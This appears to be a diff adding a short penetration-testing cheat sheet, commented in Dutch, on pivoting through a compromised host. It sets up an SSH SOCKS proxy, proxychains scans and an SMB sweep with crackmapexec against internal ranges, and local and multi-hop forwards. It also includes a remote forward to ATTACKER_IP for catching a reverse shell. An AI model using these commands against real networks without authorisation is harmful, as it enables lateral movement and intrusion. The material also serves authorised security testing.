@@ -1,0 +1,28 @@
+# SSH Dynamic SOCKS Proxy + ProxyChains
+# === SOCKS proxy opzetten ===
+ssh -N -D 127.0.0.1:1080 user@PIVOT_HOST
+# -N = geen commando uitvoeren
+# -D = dynamic port forwarding (SOCKS proxy)
+# === ProxyChains configuratie ===
+# /etc/proxychains4.conf:
+# [ProxyList]
+# socks5 127.0.0.1 1080
+# === Gebruik via proxychains ===
+proxychains nmap --top-ports=20 -sT -Pn INTERNAL_TARGET
+proxychains curl http://INTERNAL_TARGET
+proxychains firefox
+proxychains crackmapexec smb INTERNAL_RANGE/24
+# === Local port forward (specifieke poort) ===
+ssh -N -L 8080:INTERNAL_TARGET:80 user@PIVOT_HOST
+# Bereikbaar op: http://127.0.0.1:8080
+# === Remote port forward (target belt terug) ===
+ssh -N -R 4444:127.0.0.1:4444 user@ATTACKER_IP
+# Vangt reverse shell op via pivot host
+# === Dubbele pivot (multi-hop) ===
+ssh -J user@PIVOT1 user@PIVOT2
+# Of via config:
+# Host internal
+#   ProxyJump pivot1
+#   HostName PIVOT2
+# Tip: proxychains werkt NIET met SYN scan (-sS), gebruik -sT
+# Tip: sshuttle is een alternatief dat transparant routeert
